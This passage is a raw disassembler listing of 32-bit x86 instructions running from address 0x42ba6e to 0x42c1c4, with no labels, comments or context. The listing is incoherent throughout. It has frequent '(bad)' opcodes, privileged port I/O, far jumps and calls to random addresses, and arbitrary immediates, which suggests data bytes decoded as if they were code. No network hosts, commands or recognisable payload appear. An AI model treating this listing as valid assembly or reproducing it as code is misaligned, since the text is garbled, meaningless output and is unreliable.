  42ba6e:	or     dl,cl
  42ba70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba71:	in     al,0x5d
  42ba73:	fidiv  DWORD PTR [esi-0x529a555a]
  42ba79:	xor    al,0xfe
  42ba7b:	retf   0x1a5c
  42ba7e:	push   0xb680b46e
  42ba83:	sbb    dl,BYTE PTR [edi]
  42ba85:	cwde   
  42ba86:	(bad)  
  42ba87:	push   ecx
  42ba88:	fld    DWORD PTR [ebp-0x2f45d798]
  42ba8e:	inc    edi
  42ba8f:	mov    dl,0xaf
  42ba91:	jns    0x42ba6d
  42ba93:	xor    DWORD PTR [esi+0x21169568],ebx
  42ba99:	add    eax,DWORD PTR [ecx+0x3f]
  42ba9c:	inc    ebx
  42ba9d:	sub    eax,0x96dc4175
  42baa2:	inc    edi
  42baa3:	test   eax,0xf12aaa
  42baa8:	ficomp WORD PTR [edx-0x28]
  42baab:	outs   dx,BYTE PTR ds:[esi]
  42baac:	ins    BYTE PTR es:[edi],dx
  42baad:	sbb    al,0xe7
  42baaf:	mov    al,dl
  42bab1:	mov    eax,ds:0x9f256cc2
  42bab6:	dec    edx
  42bab7:	push   ebp
  42bab8:	mov    ebx,0x1c3dbc50
  42babd:	or     eax,0xdbb548b0
  42bac2:	out    0xd8,al
  42bac4:	xor    eax,0xccfeab1c
  42bac9:	or     edx,DWORD PTR [edx]
  42bacb:	mov    dl,BYTE PTR [edx-0x4972aa30]
  42bad1:	dec    ebp
  42bad2:	aaa    
  42bad3:	pop    ss
  42bad4:	in     al,dx
  42bad5:	mov    dl,ah
  42bad7:	mov    ah,0xed
  42bad9:	stos   BYTE PTR es:[edi],al
  42bada:	mov    eax,0x5d027a85
  42badf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bae0:	push   ecx
  42bae1:	xor    eax,0xdb6081d4
  42bae6:	inc    eax
  42bae7:	arpl   WORD PTR [ebp+edi*4+0xb235b08],dx
  42baee:	pusha  
  42baef:	inc    ebx
  42baf0:	mov    al,0x51
  42baf2:	retf   0xe13e
  42baf5:	xor    eax,0x8db6375e
  42bafa:	lods   eax,DWORD PTR ds:[esi]
  42bafb:	mov    WORD PTR ds:0xd1d45784,ds
  42bb01:	or     ebp,DWORD PTR [edx]
  42bb03:	push   0xffffff93
  42bb05:	outs   dx,BYTE PTR ds:[esi]
  42bb06:	pop    ds
  42bb07:	fcomp  QWORD PTR [edx-0x54]
  42bb0a:	inc    ecx
  42bb0b:	jp     0x42bb00
  42bb0d:	mov    dh,0x85
  42bb0f:	xchg   ebp,eax
  42bb10:	xchg   edi,eax
  42bb11:	lock fisubr DWORD PTR es:[esi-0x6b]
  42bb16:	push   cs
  42bb17:	scas   eax,DWORD PTR es:[edi]
  42bb18:	mov    ah,0x52
  42bb1a:	sbb    eax,0x575b60e2
  42bb1f:	adc    bl,bl
  42bb21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb22:	es mov ecx,0x9fe03f41
  42bb28:	pop    ebx
  42bb29:	(bad)  
  42bb2a:	mov    es:0x76285c85,al
  42bb30:	or     eax,0x61939a97
  42bb35:	fist   DWORD PTR [eax-0x40]
  42bb38:	and    DWORD PTR [ebx],eax
  42bb3a:	pop    edi
  42bb3b:	cmp    BYTE PTR [edi-0x4afce0e4],0xa9
  42bb42:	push   0xffffffa8
  42bb44:	push   esi
  42bb45:	adc    eax,0x6e0afcf1
  42bb4a:	ins    BYTE PTR es:[edi],dx
  42bb4b:	pop    ebx
  42bb4c:	jg     0x42bb0d
  42bb4e:	icebp  
  42bb4f:	pop    ecx
  42bb50:	mov    ds:0x47ab224b,al
  42bb55:	shr    DWORD PTR [ebp+0x7f839d26],0x21
  42bb5c:	mov    edx,0x2dadc215
  42bb61:	push   eax
  42bb62:	test   BYTE PTR [ecx],dl
  42bb64:	lds    esp,FWORD PTR [ecx+0x58fe027d]
  42bb6a:	loope  0x42bb42
  42bb6c:	push   eax
  42bb6d:	rcl    BYTE PTR [esi],0x7b
  42bb70:	loope  0x42bbc2
  42bb72:	xchg   edx,eax
  42bb73:	imul   edi,DWORD PTR [ebx+0x46eda58a],0xffffffcf
  42bb7a:	sub    esi,DWORD PTR [ebx-0x65]
  42bb7d:	and    al,0x1d
  42bb7f:	push   edi
  42bb80:	inc    edx
  42bb81:	rol    BYTE PTR ds:0x2a7a706d,1
  42bb87:	and    ch,cl
  42bb89:	mov    ecx,0xdb551d88
  42bb8e:	int    0x8f
  42bb90:	aam    0x60
  42bb92:	test   BYTE PTR [ecx-0x5b],0x85
  42bb96:	test   DWORD PTR [esi],eax
  42bb98:	jb     0x42bba7
  42bb9a:	test   DWORD PTR [edi],edx
  42bb9c:	jns    0x42bb29
  42bb9e:	es retf 
  42bba0:	(bad)  
  42bba1:	jbe    0x42bb2c
  42bba3:	mov    bl,0x4c
  42bba5:	shr    BYTE PTR [edi-0x23],0x8d
  42bba9:	fisttp WORD PTR [esi+eiz*8-0x4a]
  42bbad:	jbe    0x42bb8a
  42bbaf:	or     bl,BYTE PTR [eax-0x80]
  42bbb2:	pop    eax
  42bbb3:	and    bh,ch
  42bbb5:	cdq    
  42bbb6:	dec    edx
  42bbb7:	sbb    bl,BYTE PTR [ecx-0x4a]
  42bbba:	es push ss
  42bbbc:	push   ss
  42bbbd:	fsubr  st(6),st
  42bbbf:	jo     0x42bc15
  42bbc1:	adc    edi,ebp
  42bbc3:	sbb    eax,0x2d6dba66
  42bbc8:	adc    eax,0xf468f531
  42bbcd:	ficom  WORD PTR [edx-0x77dae202]
  42bbd3:	lods   eax,DWORD PTR ds:[esi]
  42bbd4:	and    eax,DWORD PTR [edi+0x3d5d4d70]
  42bbda:	lea    ebp,[esi-0x7833e478]
  42bbe0:	xor    ebp,DWORD PTR [ebp-0x69246c16]
  42bbe6:	fisub  DWORD PTR [ebp+0x797b3ba1]
  42bbec:	pop    ss
  42bbed:	jecxz  0x42bbca
  42bbef:	cmp    BYTE PTR [ecx-0x49517fb6],dl
  42bbf5:	jbe    0x42bbbc
  42bbf7:	dec    ebp
  42bbf8:	into   
  42bbf9:	push   esi
  42bbfa:	push   ebx
  42bbfb:	in     al,dx
  42bbfc:	fs inc edi
  42bbfe:	pop    ss
  42bbff:	or     bh,BYTE PTR [ebx]
  42bc01:	stos   BYTE PTR es:[edi],al
  42bc02:	mov    ebp,0x6e1fb8db
  42bc07:	sbb    bl,BYTE PTR [esi+esi*4]
  42bc0a:	ss clc 
  42bc0c:	loop   0x42bb99
  42bc0e:	and    BYTE PTR [ecx],ah
  42bc10:	add    ch,BYTE PTR [ebx-0x4a]
  42bc13:	push   ss
  42bc14:	fist   WORD PTR [esi+0x57]
  42bc17:	jne    0x42bbf4
  42bc19:	xor    BYTE PTR [esi+0x59],0xbc
  42bc1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc1e:	(bad)  
  42bc20:	xchg   esp,eax
  42bc21:	mov    ch,0x5
  42bc23:	fcmovnb st,st(2)
  42bc25:	mov    dl,0x1c
  42bc27:	ret    0xd2fb
  42bc2a:	fistp  WORD PTR [esi+edx*8+0x56]
  42bc2e:	fild   DWORD PTR [eax]
  42bc30:	dec    edi
  42bc31:	test   DWORD PTR [esi-0x80],0x85e5e228
  42bc38:	fcmovnb st,st(2)
  42bc3a:	ret    0x4fa4
  42bc3d:	les    eax,FWORD PTR [esi*2+0x55afb63e]
  42bc44:	in     eax,dx
  42bc45:	(bad)  
  42bc46:	(bad)  
  42bc47:	mov    dh,0x69
  42bc49:	imul   ebx,DWORD PTR [edi-0x66e5fabf],0x44
  42bc50:	sahf   
  42bc51:	imul   esi,DWORD PTR [esi+0x310ba5b5],0x2a
  42bc58:	cs loopne 0x42bc2e
  42bc5b:	inc    edi
  42bc5c:	xchg   edx,eax
  42bc5d:	mov    ecx,DWORD PTR [edi-0x1545dd4b]
  42bc63:	jae    0x42bc9a
  42bc65:	mov    ecx,DWORD PTR [esi]
  42bc67:	xor    eax,0x2dc96aad
  42bc6c:	gs pop ds
  42bc6e:	adc    al,0xc5
  42bc70:	ds ret 0xb6d
  42bc74:	push   0xd166e540
  42bc79:	mov    esp,0xb656db96
  42bc7e:	not    DWORD PTR [ebx-0x1d]
  42bc81:	pop    esp
  42bc82:	scas   al,BYTE PTR es:[edi]
  42bc83:	sbb    ah,dl
  42bc85:	push   edi
  42bc86:	loopne 0x42bc42
  42bc88:	ins    DWORD PTR es:[edi],dx
  42bc89:	sub    al,0x34
  42bc8b:	sbb    BYTE PTR [eax+esi*4-0x3479c616],dl
  42bc92:	daa    
  42bc93:	mov    dh,0xdd
  42bc95:	push   0x4eefdf80
  42bc9a:	aad    0x3f
  42bc9c:	inc    edi
  42bc9d:	dec    esi
  42bc9e:	pop    ss
  42bc9f:	ins    BYTE PTR es:[edi],dx
  42bca0:	pop    ss
  42bca1:	fdiv   DWORD PTR [esi-0x17fdbef8]
  42bca7:	or     ebp,esi
  42bca9:	rcl    BYTE PTR [esi+0x3b],1
  42bcac:	push   0xffffffab
  42bcae:	je     0x42bc5b
  42bcb0:	mov    ds:0x8b8f1993,eax
  42bcb5:	js     0x42bccb
  42bcb7:	sbb    cl,BYTE PTR [ebx]
  42bcb9:	lods   eax,DWORD PTR ds:[esi]
  42bcba:	push   ebx
  42bcbb:	out    dx,al
  42bcbc:	push   0x163668f6
  42bcc1:	or     bl,BYTE PTR [ebx]
  42bcc3:	outs   dx,BYTE PTR ds:[esi]
  42bcc4:	pop    edi
  42bcc5:	sar    DWORD PTR [edi+0x5b],cl
  42bcc8:	iret   
  42bcc9:	mov    ah,0x5b
  42bccb:	or     BYTE PTR [esi],bl
  42bccd:	(bad)  
  42bccf:	xchg   ebx,eax
  42bcd0:	jl     0x42bd0a
  42bcd2:	xlat   BYTE PTR ds:[ebx]
  42bcd3:	shl    DWORD PTR [edx-0x4a],0xdd
  42bcd7:	mov    dh,0x6d
  42bcd9:	aas    
  42bcda:	fidivr DWORD PTR [ebx]
  42bcdc:	or     esi,DWORD PTR [ebx-0x37d302ce]
  42bce2:	cmc    
  42bce3:	or     esi,DWORD PTR [esi-0x6e3a0e2b]
  42bce9:	pop    edx
  42bcea:	fimul  DWORD PTR [ecx]
  42bcec:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42bcee:	or     eax,0x8ab6d198
  42bcf3:	test   DWORD PTR [edx],esp
  42bcf5:	sbb    eax,0xb844cefc
  42bcfa:	mov    cl,0xb0
  42bcfc:	mov    al,0xf3
  42bcfe:	(bad)  
  42bcff:	dec    ecx
  42bd00:	imul   edx,DWORD PTR [ebp+ebp*4+0x53ee59ba],0x18aedb00
  42bd0b:	retf   0x32f6
  42bd0e:	xor    BYTE PTR [ebp-0x18],0x42
  42bd12:	mov    ebx,0x80755a40
  42bd17:	jnp    0x42bd75
  42bd19:	adc    edi,DWORD PTR [ecx+edx*4-0x5c247a92]
  42bd20:	out    dx,al
  42bd21:	(bad)  
  42bd22:	jb     0x42bda1
  42bd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd25:	mov    bl,0xe6
  42bd27:	dec    eax
  42bd28:	jno    0x42bd8b
  42bd2a:	imul   ecx,DWORD PTR [eax+0x301d99cd],0x16
  42bd31:	cmp    eax,0xd0a95bbd
  42bd36:	adc    dh,bh
  42bd38:	lock test DWORD PTR [ebp+0x6c6ce189],ebx
  42bd3f:	in     eax,0xb
  42bd41:	jns    0x42bd21
  42bd43:	add    BYTE PTR [ebx],dl
  42bd45:	mov    al,ds:0xc890c965
  42bd4a:	adc    al,0xbb
  42bd4c:	sub    BYTE PTR [esi],0x70
  42bd4f:	pandn  mm1,QWORD PTR [ebx+0xb8d0911]
  42bd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd57:	sbb    eax,0xb04f0490
  42bd5c:	pop    ebx
  42bd5d:	cmp    al,0xf9
  42bd5f:	and    al,0x74
  42bd61:	inc    ecx
  42bd62:	dec    ebx
  42bd63:	push   ebp
  42bd64:	mov    edx,ds
  42bd66:	xor    bh,BYTE PTR [ebp+esi*4-0x36bd2fa3]
  42bd6d:	in     eax,0x26
  42bd6f:	push   esi
  42bd70:	int    0xef
  42bd72:	or     ecx,DWORD PTR [ebx]
  42bd74:	pop    ebx
  42bd75:	mov    ebx,0xd43538ce
  42bd7a:	dec    edx
  42bd7b:	(bad)  
  42bd7d:	test   eax,0x10b01537
  42bd82:	mov    ch,0x8d
  42bd84:	inc    eax
  42bd85:	jb     0x42bd1b
  42bd87:	retf   
  42bd88:	(bad)  
  42bd89:	fnstenv [ecx+0x740746d]
  42bd8f:	and    DWORD PTR [ebp+0x7],ebx
  42bd92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd93:	lea    edx,[edi-0x4c]
  42bd96:	add    edi,DWORD PTR [eax-0x58d67b37]
  42bd9c:	xor    BYTE PTR [ecx-0x1b],0x2e
  42bda0:	adc    BYTE PTR [eax],bh
  42bda2:	push   0xe94f79d0
  42bda7:	loopne 0x42bd4e
  42bda9:	shr    BYTE PTR [ebp+0x33],1
  42bdac:	ror    DWORD PTR [edi-0x67d6beae],1
  42bdb2:	test   DWORD PTR [eax+0x47688604],ecx
  42bdb8:	push   ecx
  42bdb9:	ins    DWORD PTR es:[edi],dx
  42bdba:	and    cl,BYTE PTR [eax-0x491dd940]
  42bdc0:	fwait
  42bdc1:	mov    cl,0xe0
  42bdc3:	mov    edi,0xa95c2091
  42bdc8:	mov    dh,0x86
  42bdca:	fiadd  DWORD PTR [ebp+0x16]
  42bdcd:	clc    
  42bdce:	add    DWORD PTR [ecx+0x75],ecx
  42bdd1:	cmp    al,bl
  42bdd3:	fidiv  DWORD PTR [esi+0x5b]
  42bdd6:	pop    edx
  42bdd7:	mov    edx,0x4108e5a4
  42bddc:	push   eax
  42bddd:	ret    0x71e0
  42bde0:	imul   eax,DWORD PTR [ebx],0x11
  42bde3:	mov    bh,0x4c
  42bde5:	xor    eax,0xc46da4ca
  42bdea:	hlt    
  42bdeb:	inc    edx
  42bdec:	fist   DWORD PTR [ebp+esi*8-0x59]
  42bdf0:	stc    
  42bdf1:	mov    edi,0xf7ad1f18
  42bdf6:	test   eax,0xc7fcad85
  42bdfb:	test   eax,0x443dcd00
  42be00:	je     0x42be45
  42be02:	inc    eax
  42be03:	add    ebp,DWORD PTR [edx]
  42be05:	dec    esp
  42be06:	les    esp,FWORD PTR [ebp-0x42]
  42be09:	in     eax,dx
  42be0a:	sbb    DWORD PTR [edi+0x71],eax
  42be0d:	pop    eax
  42be0e:	xor    BYTE PTR [esi],0x35
  42be11:	xchg   ebp,eax
  42be12:	lods   eax,DWORD PTR ds:[esi]
  42be13:	fcom   st(3)
  42be15:	inc    ecx
  42be16:	jo     0x42be21
  42be18:	xor    BYTE PTR [eax-0x720e1ec9],bh
  42be1e:	scas   al,BYTE PTR es:[edi]
  42be1f:	stos   BYTE PTR es:[edi],al
  42be20:	dec    ebp
  42be21:	(bad)  
  42be22:	fnstcw WORD PTR [esi]
  42be24:	cli    
  42be25:	cmc    
  42be26:	rol    BYTE PTR [edx],0xd1
  42be29:	adc    ah,al
  42be2b:	lods   al,BYTE PTR ds:[esi]
  42be2c:	cmp    eax,0x6a6848
  42be31:	ror    BYTE PTR [ebp+0x27c50185],0x48
  42be38:	sbb    eax,0xdb7cb050
  42be3d:	xor    ch,dh
  42be3f:	jmp    0xf1435e79
  42be44:	push   eax
  42be45:	fs mov dh,0xcb
  42be48:	ret    0x52d6
  42be4b:	add    eax,0xedcd814d
  42be50:	pop    ss
  42be51:	add    eax,0x85d179c8
  42be56:	xchg   BYTE PTR [edx],ah
  42be58:	push   ss
  42be59:	inc    esp
  42be5a:	popa   
  42be5b:	nop
  42be5c:	xchg   ecx,eax
  42be5d:	inc    esi
  42be5e:	pop    ecx
  42be5f:	pusha  
  42be60:	push   edi
  42be61:	push   eax
  42be62:	lds    ebx,FWORD PTR [ecx+0x5dd8310c]
  42be68:	adc    eax,0xef4cd41b
  42be6d:	sbb    al,0x12
  42be6f:	sbb    DWORD PTR [ecx+0x7],ebp
  42be72:	sub    eax,0x5242b251
  42be77:	jbe    0x42bdfd
  42be79:	outs   dx,BYTE PTR ds:[esi]
  42be7a:	jbe    0x42bed7
  42be7c:	sub    BYTE PTR [eax+0x77],dl
  42be7f:	(bad)  
  42be80:	cli    
  42be81:	xor    cl,BYTE PTR [eax+0x45]
  42be84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be85:	adc    al,0xa
  42be87:	test   DWORD PTR [ebp+0x5ac18d74],esp
  42be8d:	mov    ch,0xa0
  42be8f:	pusha  
  42be90:	fld    TBYTE PTR [esi]
  42be92:	mov    ds:0x982f5706,eax
  42be97:	pop    edi
  42be98:	inc    ecx
  42be99:	mov    DWORD PTR [edx-0x57],ebp
  42be9c:	in     eax,dx
  42be9d:	lods   eax,DWORD PTR ds:[esi]
  42be9e:	sub    eax,0x88ade075
  42bea3:	test   BYTE PTR [ebx-0x65],bl
  42bea6:	call   0xc1060ded
  42beab:	rol    BYTE PTR [eax-0x34abe316],cl
  42beb1:	test   DWORD PTR [esi],esi
  42beb3:	pop    edx
  42beb4:	xchg   edi,eax
  42beb5:	out    0xdd,eax
  42beb7:	fcmovbe st,st(4)
  42beb9:	std    
  42beba:	arpl   WORD PTR [esi],dx
  42bebc:	fisubr DWORD PTR [ebp+0x6b]
  42bebf:	gs add eax,0x8e1a7f0
  42bec5:	pop    esp
  42bec6:	cmp    bh,BYTE PTR [ebx-0x49249deb]
  42becc:	push   0xffffff89
  42bece:	mov    edi,0x3f7c8f8d
  42bed3:	sub    ah,al
  42bed5:	mov    dh,0x2d
  42bed7:	sbb    eax,0xa73e685c
  42bedc:	pop    eax
  42bedd:	fdiv   DWORD PTR [esi-0x893948a]
  42bee3:	inc    eax
  42bee4:	sbb    ecx,DWORD PTR [esi+ebp*2]
  42bee7:	or     esp,esi
  42bee9:	arpl   WORD PTR [ecx-0x5f],bx
  42beec:	fdivr  DWORD PTR [esi-0x23]
  42beef:	sbb    esp,DWORD PTR ss:[edi+0x8]
  42bef3:	(bad)  
  42bef4:	repnz hlt 
  42bef6:	bswap  esp
  42bef8:	loopne 0x42beaf
  42befa:	pop    ebp
  42befb:	fcomp  DWORD PTR [edx]
  42befd:	mov    al,ds:0xaacb011e
  42bf02:	pop    es
  42bf03:	out    dx,al
  42bf04:	les    edx,FWORD PTR [ecx-0x49]
  42bf07:	mov    dh,0xad
  42bf09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf0a:	and    dl,0x23
  42bf0d:	sbb    al,0xdf
  42bf0f:	fiadd  DWORD PTR [ecx+0x752e2aed]
  42bf15:	sub    eax,0x24e33214
  42bf1a:	xchg   esi,eax
  42bf1b:	cdq    
  42bf1c:	jmp    0x42bf60
  42bf1e:	xor    al,0x14
  42bf20:	mov    cl,0x2c
  42bf22:	cmc    
  42bf23:	dec    edi
  42bf24:	inc    ecx
  42bf25:	mov    edx,0xb746ca05
  42bf2a:	ja     0x42bf68
  42bf2c:	mov    dh,0x31
  42bf2e:	xchg   edx,eax
  42bf2f:	or     al,0x36
  42bf31:	mov    dh,0x8d
  42bf33:	test   DWORD PTR [ebx],esp
  42bf35:	aaa    
  42bf36:	inc    ebp
  42bf37:	test   BYTE PTR [edx-0x33b128fb],0x41
  42bf3e:	stc    
  42bf3f:	ins    DWORD PTR es:[edi],dx
  42bf40:	(bad)  ds:0x59bf891c
  42bf46:	inc    edx
  42bf47:	add    BYTE PTR [eax],0x2f
  42bf4a:	sbb    BYTE PTR [ecx+0x71b4b8d5],dh
  42bf50:	jno    0x42bf90
  42bf52:	or     DWORD PTR [edx-0x13],0x1
  42bf56:	sub    DWORD PTR [ecx-0x35],esp
  42bf59:	shl    DWORD PTR [esi-0x1979f125],0x44
  42bf60:	rcl    BYTE PTR [ecx-0x49f7e518],1
  42bf66:	pusha  
  42bf67:	daa    
  42bf68:	jg     0x42bfbb
  42bf6a:	xlat   BYTE PTR ds:[ebx]
  42bf6b:	mov    WORD PTR [ebp-0x26],ds
  42bf6e:	fcom   DWORD PTR [esi]
  42bf70:	dec    esp
  42bf71:	pusha  
  42bf72:	or     BYTE PTR [ebx-0x322e2d8b],al
  42bf78:	aam    0xb4
  42bf7a:	in     eax,dx
  42bf7b:	repnz lods eax,DWORD PTR ds:[esi]
  42bf7d:	xlat   BYTE PTR ds:[ebx]
  42bf7e:	cmc    
  42bf7f:	in     al,0x34
  42bf81:	add    BYTE PTR [ebx],ah
  42bf83:	mov    ds:0xa4b31dca,eax
  42bf88:	mov    ds:0x3556b70,eax
  42bf8d:	(bad)  
  42bf8e:	jae    0x42c00f
  42bf90:	and    eax,0x6b6aa130
  42bf95:	push   0xffffffdb
  42bf97:	shl    bh,cl
  42bf99:	lds    esp,FWORD PTR [ebx-0x4d24bab4]
  42bf9f:	mov    ch,0xf9
  42bfa1:	and    bl,dl
  42bfa3:	sub    ebp,ebx
  42bfa5:	lods   eax,DWORD PTR ds:[esi]
  42bfa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfa7:	(bad)  [esi]
  42bfa9:	or     dh,BYTE PTR [esi]
  42bfab:	je     0x42bf87
  42bfad:	in     al,0xe5
  42bfaf:	int3   
  42bfb0:	fs das 
  42bfb2:	fild   WORD PTR [ecx]
  42bfb4:	cs jne 0x42c00b
  42bfb7:	mov    dl,0x1b
  42bfb9:	fstp   st(1)
  42bfbb:	xchg   DWORD PTR [ebx-0x55],eax
  42bfbe:	mov    dh,0x4d
  42bfc0:	mov    cl,0xbb
  42bfc2:	std    
  42bfc3:	xchg   esp,eax
  42bfc4:	xlat   BYTE PTR ds:[ebx]
  42bfc5:	xchg   BYTE PTR [edi-0x2e],dh
  42bfc8:	hlt    
  42bfc9:	push   edi
  42bfca:	add    DWORD PTR [edi+0x3ee863b6],esi
  42bfd0:	jge    0x42bfec
  42bfd2:	inc    ecx
  42bfd3:	imul   ebx,ebx,0x5146c6c2
  42bfd9:	outs   dx,DWORD PTR ds:[esi]
  42bfda:	call   0x97f8:0x64dfa475
  42bfe1:	push   esi
  42bfe2:	fsubr  DWORD PTR [esi]
  42bfe4:	sbb    ecx,DWORD PTR [edx+0x2c6d3df4]
  42bfea:	sti    
  42bfeb:	fcomp  QWORD PTR [ecx-0x48]
  42bfee:	ins    DWORD PTR es:[edi],dx
  42bfef:	pop    ebx
  42bff0:	in     eax,dx
  42bff1:	push   ds
  42bff2:	aas    
  42bff3:	es and eax,0xdda0ad54
  42bff9:	pop    ds
  42bffa:	pop    edx
  42bffb:	ins    DWORD PTR es:[edi],dx
  42bffc:	xchg   edi,eax
  42bffd:	cmp    ah,BYTE PTR [eax-0x58f7f2c2]
  42c003:	push   eax
  42c004:	shl    DWORD PTR [ebx],1
  42c006:	mov    al,0xd5
  42c008:	push   esp
  42c009:	mov    cl,0x4a
  42c00b:	(bad)  
  42c00c:	mov    esi,0xe8d349cb
  42c011:	sub    BYTE PTR [esi],0x2c
  42c014:	xorps  xmm0,XMMWORD PTR [ebp-0x60c40f05]
  42c01b:	pop    ebp
  42c01c:	inc    esp
  42c01d:	(bad)  
  42c01f:	pusha  
  42c020:	jb     0x42bfc8
  42c022:	pop    esi
  42c023:	(bad)  
  42c024:	mov    al,0xb
  42c026:	add    eax,0x2e8a0edb
  42c02b:	xchg   ebx,eax
  42c02c:	jne    0x42c020
  42c02e:	outs   dx,BYTE PTR ds:[esi]
  42c02f:	and    al,0x80
  42c031:	pop    eax
  42c032:	fdiv   DWORD PTR [esi-0x6b]
  42c035:	mov    ebp,0xa39be6cc
  42c03a:	out    0x11,al
  42c03c:	(bad)  
  42c03e:	mov    edx,0x31b9e2c7
  42c043:	xchg   esp,eax
  42c044:	jo     0x42bfe0
  42c046:	inc    ebx
  42c047:	mov    cl,0x21
  42c049:	ss daa 
  42c04b:	sbb    ecx,ecx
  42c04d:	ret    
  42c04e:	stos   DWORD PTR es:[edi],eax
  42c04f:	idiv   edi
  42c051:	adc    DWORD PTR [ebx+0x34],ecx
  42c054:	pop    edx
  42c055:	push   ebx
  42c056:	or     esi,DWORD PTR [edi]
  42c058:	inc    esi
  42c059:	push   0x22
  42c05b:	mov    dh,0x4b
  42c05d:	dec    ebp
  42c05e:	aad    0x4e
  42c060:	lds    esp,FWORD PTR [esi-0x555704b4]
  42c066:	fcmovu st,st(0)
  42c068:	jmp    0x4bed:0xb152c1a9
  42c06f:	push   0x74511b6c
  42c074:	das    
  42c075:	jb     0x42c066
  42c077:	xchg   ebx,eax
  42c078:	push   esp
  42c079:	mov    DWORD PTR [ebp-0x57],ebp
  42c07c:	frstor [esi+0x2]
  42c07f:	xor    esp,edx
  42c081:	ja     0x42c094
  42c083:	mov    ecx,0xb6d6a069
  42c088:	or     eax,0x5be77970
  42c08d:	sub    ah,ch
  42c08f:	clc    
  42c090:	and    bl,BYTE PTR [edx]
  42c092:	push   ebx
  42c093:	cs ins BYTE PTR es:[edi],dx
  42c095:	(bad)  
  42c096:	fcmovnu st,st(1)
  42c098:	sub    DWORD PTR [edi+0x309827c2],esp
  42c09e:	push   edx
  42c09f:	add    eax,0x1b0aabb5
  42c0a4:	stos   BYTE PTR es:[edi],al
  42c0a5:	jg     0x42c08f
  42c0a7:	fdiv   QWORD PTR [ecx]
  42c0a9:	ins    DWORD PTR es:[edi],dx
  42c0aa:	sbb    ch,BYTE PTR [eax]
  42c0ac:	mov    dh,0x5b
  42c0ae:	rcl    DWORD PTR [eax],1
  42c0b0:	cmp    al,0x20
  42c0b2:	sbb    BYTE PTR [edi-0x36],bh
  42c0b5:	lea    esi,[esi+0x8b5b76d]
  42c0bb:	(bad)  
  42c0bc:	xchg   ebp,eax
  42c0bd:	adc    edi,0xa1723b5d
  42c0c3:	sub    eax,0xeb13dadc
  42c0c8:	dec    ebp
  42c0c9:	sub    al,0x61
  42c0cb:	mov    edi,0x7c3b44df
  42c0d0:	rcl    BYTE PTR [ecx+eax*8],1
  42c0d3:	jbe    0x42c08b
  42c0d5:	stos   BYTE PTR es:[edi],al
  42c0d6:	dec    ebp
  42c0d7:	adc    BYTE PTR [ecx+0x5b6db6ab],bh
  42c0dd:	mov    ebx,0xaaf58f91
  42c0e2:	shl    BYTE PTR ds:[ecx+0xa],1
  42c0e6:	push   esi
  42c0e7:	bound  ebp,QWORD PTR [ebx+ebx*8]
  42c0ea:	(bad)  
  42c0eb:	push   edx
  42c0ec:	ror    DWORD PTR [ebp+0x45],1
  42c0ef:	mov    edx,0x40a15efc
  42c0f4:	shl    DWORD PTR [eax-0x3bbe97a6],1
  42c0fa:	and    BYTE PTR [ebp+eiz*4-0x73],bh
  42c0fe:	es mov eax,0xa75a3ce1
  42c104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c105:	fsub   DWORD PTR [esi]
  42c107:	jmp    0x8dd07743
  42c10c:	call   0x28d1:0x2bf0769c
  42c113:	inc    edx
  42c114:	fs rcr ch,cl
  42c117:	bound  eax,QWORD PTR [ebx-0x6092fef2]
  42c11d:	and    DWORD PTR [eax-0x2493ebfc],ebp
  42c123:	lods   eax,DWORD PTR ds:[esi]
  42c124:	in     al,dx
  42c125:	aam    0xa7
  42c127:	mov    DWORD PTR [ebp+eax*1-0x6b],esi
  42c12b:	fs sub eax,0x720d6c2d
  42c131:	pop    ss
  42c132:	inc    esp
  42c133:	in     eax,0x25
  42c135:	scas   al,BYTE PTR es:[edi]
  42c136:	or     ebx,DWORD PTR [ebp-0x4b32776a]
  42c13c:	aam    0xa
  42c13e:	cmc    
  42c13f:	push   eax
  42c140:	aas    
  42c141:	inc    edi
  42c142:	repnz or esi,DWORD PTR [edi-0x65d764a]
  42c149:	lock adc al,0x8
  42c14c:	out    dx,eax
  42c14d:	cli    
  42c14e:	inc    ebx
  42c14f:	lods   al,BYTE PTR ds:[esi]
  42c150:	sub    al,0x1b
  42c152:	dec    ebp
  42c153:	add    eax,0xb93ebd7
  42c158:	adc    al,0x40
  42c15a:	mov    cl,0x6d
  42c15c:	sub    al,0xc7
  42c15e:	jl     0x42c1cc
  42c160:	sbb    BYTE PTR [edx+eiz*2],ch
  42c163:	inc    esi
  42c164:	add    edx,eax
  42c166:	lods   eax,DWORD PTR ds:[esi]
  42c167:	add    al,0x65
  42c169:	xor    dl,BYTE PTR [ebx+ecx*1]
  42c16c:	enter  0x811e,0x88
  42c170:	or     esp,ebp
  42c172:	aam    0x3b
  42c174:	pop    eax
  42c175:	shl    BYTE PTR ds:0xc04db6ec,0xad
  42c17c:	cmp    dl,BYTE PTR [edi]
  42c17e:	pop    edx
  42c17f:	inc    ebp
  42c180:	mov    ss,WORD PTR [esi]
  42c182:	pop    eax
  42c183:	pop    ecx
  42c184:	add    DWORD PTR ds:0x9002eb74,edx
  42c18a:	in     al,0x5
  42c18c:	sub    eax,ebp
  42c18e:	sub    al,0xb0
  42c190:	rcr    dl,1
  42c192:	popa   
  42c193:	sbb    BYTE PTR [edi+0x28],bl
  42c196:	jbe    0x42c131
  42c198:	mov    edx,0x81b1586
  42c19d:	xor    BYTE PTR cs:0xa6ed0b41,0xc6
  42c1a5:	mov    dh,0x50
  42c1a7:	inc    edi
  42c1a8:	push   esi
  42c1a9:	test   DWORD PTR [eax-0x60e8a321],eax
  42c1af:	sub    edx,DWORD PTR [ebp+0x6d]
  42c1b2:	loope  0x42c163
  42c1b4:	mov    esi,0x2d32627e
  42c1b9:	outs   dx,BYTE PTR ds:[esi]
  42c1ba:	shr    BYTE PTR [edx],1
  42c1bc:	fisubr DWORD PTR [ebp+0x30]
  42c1bf:	push   0xcfdd0aef
  42c1c4:	fst    st(6)
